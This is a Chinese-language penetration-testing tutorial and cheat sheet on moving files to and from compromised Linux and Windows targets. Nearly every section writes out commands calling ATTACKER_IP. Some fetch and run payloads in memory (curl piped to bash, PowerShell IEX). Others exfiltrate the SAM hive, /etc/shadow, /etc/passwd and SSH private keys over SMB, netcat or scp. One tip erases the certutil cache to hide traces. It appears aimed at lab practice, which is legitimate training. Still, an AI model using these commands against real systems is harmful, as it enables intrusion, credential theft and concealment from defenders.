## 學習目標

- 能依作業系統與工具可用性選擇最適合的傳輸方法。
- 能在 Linux/Windows 上用多種方式上傳與下載。
- 知道如何用 base64 在沒有工具的環境搬移小型內容。
- 能架設簡易 HTTP server 傳輸工具到目標。

---

## 理論基礎

```text
檔案傳輸方向：
  攻擊機 → 目標（下載）：傳遞工具、腳本、exploit
  目標 → 攻擊機（上傳）：取得密碼檔、設定檔、sensitive data

選擇傳輸方法的三個問題：
  1. 目標能否出站？（能 → HTTP/HTTPS；不能 → SMB/管道/base64）
  2. 目標有什麼工具？（wget/curl/python/certutil/powershell）
  3. 要搬多大的東西？（大檔 → HTTP；小片段 → base64/echo）

常見傳輸協定：
  HTTP/HTTPS → 最通用，攻擊機架 http.server
  SMB → Windows 到 Windows 最自然，impacket-smbserver
  SCP → 已有 SSH 存取時最方便
  Base64 → 不需要網路工具，純 shell 可用
  NC（netcat）→ 任意方向傳輸，但需要兩端都有 nc
```

## 方法一：攻擊機架設 HTTP Server

```bash
# Python3（最常用）
python3 -m http.server 8080
# 在當前目錄啟動 HTTP server，監聽 8080

# Python3 指定目錄
python3 -m http.server 8080 --directory /opt/tools/
# --directory → 指定提供的目錄

# Python2
python -m SimpleHTTPServer 8080

# 攻擊機 IP 確認
ip addr show tun0 | grep inet
# tun0 → VPN/HTB 的 TUN 介面 IP
# 確保和目標在同一網段

# 或用 updog（支援上傳）
updog -p 8080
# pip3 install updog → 安裝
# 支援 PUT 上傳（目標也可以傳檔回攻擊機）
```

## 方法二：Linux 目標下載

```bash
# wget（最常見）
wget http://ATTACKER_IP:8080/tool -O /tmp/tool
# -O → 指定輸出路徑和檔名（預設用 URL 最後段）

# wget 背景執行
wget http://ATTACKER_IP:8080/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh

# curl
curl http://ATTACKER_IP:8080/tool -o /tmp/tool
# -o → 輸出路徑
curl -s http://ATTACKER_IP:8080/tool -o /tmp/tool
# -s → silent（不顯示進度）

# curl 直接下載並執行（不落地）
curl -s http://ATTACKER_IP:8080/script.sh | bash
# 直接 pipe 到 bash，不需要寫入磁碟

# Python3 下載
python3 -c "import urllib.request; urllib.request.urlretrieve('http://ATTACKER_IP:8080/tool', '/tmp/tool')"

# Python2 下載
python -c "import urllib; urllib.urlretrieve('http://ATTACKER_IP:8080/tool', '/tmp/tool')"

# 驗證下載完整性
md5sum /tmp/tool
# 對比攻擊機上的：md5sum /opt/tools/tool
```

## 方法三：Windows 目標下載

```bash
# PowerShell（最通用）
powershell -c "Invoke-WebRequest -Uri 'http://ATTACKER_IP:8080/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"
# Invoke-WebRequest（IWR）→ 相當於 wget/curl

# PowerShell 簡寫
powershell -c "IWR 'http://ATTACKER_IP:8080/shell.exe' -OutFile 'C:\Temp\shell.exe'"

# PowerShell WebClient（舊版 Windows 更相容）
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:8080/shell.exe','C:\Temp\shell.exe')"

# PowerShell 下載並直接執行（不落地）
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8080/script.ps1')"
# IEX → Invoke-Expression（在記憶體中執行腳本）

# certutil（LOLBAS，Windows 內建）
certutil -urlcache -split -f http://ATTACKER_IP:8080/shell.exe C:\Temp\shell.exe
# -urlcache → 下載並快取
# -split → 分塊下載（較穩定）

# bitsadmin（舊版 Windows 2008/2012）
bitsadmin /transfer job /download /priority normal http://ATTACKER_IP:8080/shell.exe C:\Temp\shell.exe
# bitsadmin → Background Intelligent Transfer Service

# curl（Windows 10 1803+）
curl.exe http://ATTACKER_IP:8080/shell.exe -o C:\Temp\shell.exe
```

## 方法四：SMB 傳輸（Windows，無需 HTTP 出站）

```bash
# ── 攻擊機架設 SMB Server ──
# impacket-smbserver（不需認證，適合快速傳輸）
impacket-smbserver SHARE /opt/tools/ -smb2support
# SHARE → SMB 分享名稱
# /opt/tools/ → 分享目錄
# -smb2support → 支援 SMB2（Windows 10 需要）

# 帶認證版本（某些情況需要）
impacket-smbserver SHARE /opt/tools/ -smb2support -username user -password pass

# ── 目標（Windows cmd/PS）下載 ──
copy \\ATTACKER_IP\SHARE\shell.exe C:\Temp\shell.exe
# 或 PowerShell
Copy-Item \\ATTACKER_IP\SHARE\shell.exe C:\Temp\shell.exe

# ── 目標上傳到攻擊機 ──
copy C:\Windows\System32\config\SAM \\ATTACKER_IP\SHARE\SAM
# 把 SAM 複製到攻擊機的 SHARE 目錄

# 直接從 SMB 執行（不落地）
\\ATTACKER_IP\SHARE\shell.exe
# Windows 可直接執行 UNC 路徑的 EXE
```

## 方法五：Base64 傳輸（不需網路工具）

```bash
# ── 攻擊機：將檔案 base64 編碼 ──
base64 /opt/tools/linpeas.sh | tr -d '\n'
# base64 → 編碼
# tr -d '\n' → 移除換行（方便複製貼上）

# ── 目標：貼上 base64 並解碼 ──
echo "BASE64_STRING_HERE" | base64 -d > /tmp/linpeas.sh
# base64 -d → 解碼
chmod +x /tmp/linpeas.sh

# Windows 端（攻擊機編碼）
[Convert]::ToBase64String([IO.File]::ReadAllBytes('/opt/tools/shell.exe')) | clip
# clip → 複製到剪貼簿

# Windows 目標解碼
$b64 = "BASE64_HERE"
[IO.File]::WriteAllBytes("C:\Temp\shell.exe", [Convert]::FromBase64String($b64))
```

## 方法六：NC 傳輸（雙向，不需 HTTP）

```bash
# 傳送檔案到目標（攻擊機 → 目標）
# 攻擊機：監聽並傳送
nc -lvnp 4444 < /opt/tools/linpeas.sh

# 目標：接收
nc ATTACKER_IP 4444 > /tmp/linpeas.sh

# 目標 → 攻擊機（反向）
# 攻擊機：監聽並接收
nc -lvnp 4444 > /tmp/received_file

# 目標：傳送
nc ATTACKER_IP 4444 < /etc/passwd

# 驗證（md5sum 確認完整性）
md5sum /tmp/linpeas.sh   # 目標
md5sum /opt/tools/linpeas.sh  # 攻擊機（應相同）
```

---

## 方法七：SCP（已有 SSH 存取）

```bash
# 攻擊機 → 目標（上傳工具）
scp /opt/tools/linpeas.sh user@TARGET_IP:/tmp/
# scp → Secure Copy（走 SSH）

# 目標 → 攻擊機（取得敏感檔案）
scp user@TARGET_IP:/etc/passwd /tmp/target_passwd
scp user@TARGET_IP:/home/user/.ssh/id_rsa /tmp/target_key

# 目錄整個複製
scp -r user@TARGET_IP:/home/user/ /tmp/user_home/
# -r → 遞迴

# 使用私鑰認證
scp -i /tmp/id_rsa user@TARGET_IP:/etc/shadow /tmp/shadow
```

## 決策流程

```
需要傳輸檔案
    ↓
判斷方向（攻擊機→目標 / 目標→攻擊機）
    ↓
目標 OS？
  Linux：
    → 可出站 + wget/curl？→ wget/curl http://ATTACKER_IP:8080/file
    → 可出站 + python？→ python3 urllib.request
    → 有 SSH？→ SCP
    → 不能出站？→ base64 + echo 貼上 / nc（雙向 nc）
  Windows：
    → PowerShell 可用？→ IWR / DownloadFile
    → 限制 PS？→ certutil / bitsadmin
    → 在內網？→ impacket-smbserver + copy
    → 無工具？→ base64 + powershell decode
    ↓
驗證完整性（md5sum）
```

## 速查表

```bash
# 攻擊機架 HTTP server
python3 -m http.server 8080

# Linux 下載
wget http://ATTACKER_IP:8080/file -O /tmp/file
curl -s http://ATTACKER_IP:8080/file -o /tmp/file

# Windows 下載
powershell -c "IWR 'http://ATTACKER_IP:8080/file' -OutFile 'C:\Temp\file'"
certutil -urlcache -split -f http://ATTACKER_IP:8080/file C:\Temp\file

# SMB（Windows）
impacket-smbserver SHARE /opt/tools/ -smb2support
# 目標：copy \\ATTACKER_IP\SHARE\file C:\Temp\file

# Base64（Linux）
base64 file | tr -d '\n'           # 攻擊機編碼
echo "BASE64" | base64 -d > file  # 目標解碼

# NC 傳輸
nc -lvnp 4444 < file              # 攻擊機傳送
nc ATTACKER_IP 4444 > file        # 目標接收

# SCP
scp file user@TARGET_IP:/tmp/
scp user@TARGET_IP:/etc/passwd /tmp/
```

---

## 常見錯誤與排查

- 下載後忘記 chmod +x → 無法執行；`chmod +x /tmp/tool`。
- base64 編碼含換行 → 解碼失敗；加 `tr -d '\n'` 移除換行。
- SMB 沒加 -smb2support → Windows 10 無法連線（需要 SMB2）。
- 下載路徑沒有寫入權限 → 改用 /tmp、C:\Windows\Temp、C:\Users\PUBLIC。
- certutil 留下 URL 快取記錄 → 清除：`certutil -urlcache -split -f http://ATTACKER_IP/file delete`。
